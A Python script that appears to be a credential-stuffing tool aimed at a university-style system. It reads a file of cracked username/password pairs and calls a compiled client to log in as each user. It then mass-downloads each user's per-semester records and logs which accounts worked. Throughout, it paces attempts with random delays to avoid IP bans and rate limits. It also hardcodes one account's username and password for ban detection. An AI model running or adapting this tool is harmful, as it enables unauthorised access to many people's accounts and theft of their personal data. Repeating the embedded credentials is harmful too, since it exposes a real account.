import sys
from concurrent.futures import ProcessPoolExecutor, as_completed
import subprocess
import os
import re
import time, random
from multiprocessing.synchronize import Event

from tqdm.auto import tqdm  # <- Progress bar
from filelock import FileLock

# use with caution!!! High-frequency multi-user login failure may ban your ip.

# Path to your compiled executable
exe_path = "./main.exe"

# Path to the credentials file
creds_file = "SecureCracked.txt"

# Output file to store successful lines
successful_users_file = "SecureCrackedMain.txt"

def get_semesters(username: str) -> list[str]:
    match = re.search(r'(14|15|16|17|18|19|20|21|22|23|24)', username)
    if match:
        start_year = int('20' + match.group(1))
        semesters = []
        for year in range(start_year, 2024):
            semesters.extend([f"{year}-{year+1}-{i}" for i in range(1, 4)])
        semesters.append("2024-2025-1")
        return semesters
    else:
        return ["2024-2025-4"]

def run_semester(username: str, password: str, semester: str):
    output_dir = os.path.join("downloads", username)
    os.makedirs(output_dir, exist_ok=True)

    print(f"▶ {username} → {semester}")
    result = subprocess.run(
        [exe_path, "-u", username, "-p", password, "--prefix", output_dir, "-s", semester],
        capture_output=True,
        text=True
    )
    return semester, result.returncode, result.stdout, result.stderr


def login_check(username: str, password: str) -> bool:
    """ Function to check login with an empty semester (2024-2025-4). Returns False if BAD_CREDENTIALS is found. """
    print(f"Trying login for {username} with empty semester...")
    result = subprocess.run(
        [exe_path, "-u", username, "-p", password, "-s", "2024-2025-4"],
        capture_output=True,
        text=True
    )

    if "BAD_CREDENTIALS" in result.stdout:
        print(f"❌ {username} login failed. Skipping user.")
        return False
    return True

def process_user_line(line: str, abort_event: Event):
    if abort_event.is_set():
        return None  # Exit early if abort signal is already triggered

    line = line.strip()
    if not line or "::::" not in line:
        return None

    try:
        parts = line.split("::::")
        username = parts[0]
        tokens = parts[1].split(":")
        password = tokens[-1]

        # First, check login with empty semester
        if not login_check(username, password):
            print(f"🔍 Verifying login failure with known good credentials...")
            if not login_check("sijx24", "123moyuer"):
                print("🚫 Possible IP ban or rate limit! Skipping all users temporarily.")
                time.sleep(5)
                sys.exit(1)  # Exit the entire program immediately
            else:
                print(f"❌ Invalid credentials for {username}, skipping.")
                time.sleep(random.uniform(5, 10))
            return None  # Skip to next user

        semesters = get_semesters(username)
        output_dir = os.path.join("downloads", username)

        print(f"\n📌 Processing user: {username}")
        with ProcessPoolExecutor(max_workers=6) as executor:  # Semester-level parallelism
            futures = []
            for semester in semesters:
                future = executor.submit(run_semester, username, password, semester)
                futures.append(future)
                time.sleep(random.uniform(5, 10))  # ⏱ Add random delay between submissions (tune as needed)

            for future in tqdm(as_completed(futures), total=len(futures),
                               desc=f"⏳ {username}", unit="sem", position=1, leave=False, dynamic_ncols=True):
                semester, returncode, stdout, stderr = future.result()
                print(f"\n🗓 {semester} finished with code {returncode}")
                print("  └─ STDOUT:", stdout[:400])
                print("  └─ STDERR:", stderr[:400])

        lock = FileLock(successful_users_file + ".lock")
        # Check if output_dir is not empty
        if any(os.scandir(output_dir)):
            with lock:  # <-- file is locked during write
                with open(successful_users_file, "a", encoding="utf-8") as success_file:
                    success_file.write(line + "\n")
            print(f"✅ Output for {username} saved.")

    except Exception as e:
        print(f"❌ Error processing user {line}")
        print("   →", e)

# MAIN CONTROL
if __name__ == "__main__":
    abort_event = Event()

    with open(creds_file, "r", encoding="utf-8") as f:
        lines = [line for line in f if line.strip() and "::::" in line]

    with tqdm(total=len(lines), desc="🌍 All Users", unit="user", position=0, leave=True, dynamic_ncols=True) as global_bar:
        with ProcessPoolExecutor(max_workers=2) as user_executor:  # User-level parallelism
            future_to_line = {}
            for line in lines:
                if abort_event.is_set():
                    break  # Stop submitting new users
                future = user_executor.submit(process_user_line, line, abort_event)
                future_to_line[future] = line
                time.sleep(random.uniform(5, 10))  # ⏱ Delay between user submissions (adjust as needed)

            for future in as_completed(future_to_line):
                if abort_event.is_set():
                    print("⚠️ Aborting due to global error signal.")
                    break
                _ = future.result()
                global_bar.update(1)